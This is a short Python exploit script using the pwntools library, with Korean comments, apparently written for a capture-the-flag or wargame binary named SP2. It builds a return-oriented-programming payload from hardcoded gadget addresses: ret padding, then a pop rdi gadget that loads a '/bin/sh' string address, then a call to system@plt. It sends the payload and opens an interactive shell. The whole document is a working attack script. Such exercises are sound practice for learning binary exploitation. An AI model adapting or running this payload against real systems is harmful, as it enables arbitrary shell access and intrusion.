from pwn import *

p = process('./SP2')

# rop 가젯
ret = 0x40101a
pop_rdi_ret = 0x401243

system_plt = 0x401060 # system 함수 주소 설정
binsh = 0x402004 # "/bin/sh" 문자열 주소 찾기

# rop 페이로드 작성
payload = p64(ret) * 6 # 패딩
payload += p64(pop_rdi_ret) # rdi 레지스터에 "/bin/sh" 주소 세팅
payload += p64(binsh)
payload += p64(system_plt) # system("/bin/sh") 호출
payload += p64(0)
payload += b'\x00'

p.send(payload)
p.interactive()